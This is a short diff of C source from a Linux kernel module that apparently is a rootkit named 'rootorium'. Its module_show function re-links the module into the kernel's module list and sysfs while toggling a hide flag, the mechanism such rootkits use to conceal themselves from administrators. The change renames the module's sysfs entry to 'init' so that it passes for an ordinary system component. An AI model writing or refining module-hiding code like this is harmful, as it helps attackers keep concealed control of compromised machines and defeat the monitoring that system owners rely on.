@@ -125,7 +125,7 @@ static void module_show(void)
 
     list_add(&THIS_MODULE->list, module_previous);
     ret = kobject_add(&THIS_MODULE->mkobj.kobj,
-        THIS_MODULE->mkobj.kobj.parent, "rootorium");
+        THIS_MODULE->mkobj.kobj.parent, "init");
     hide_module = !hide_module;
 }
 
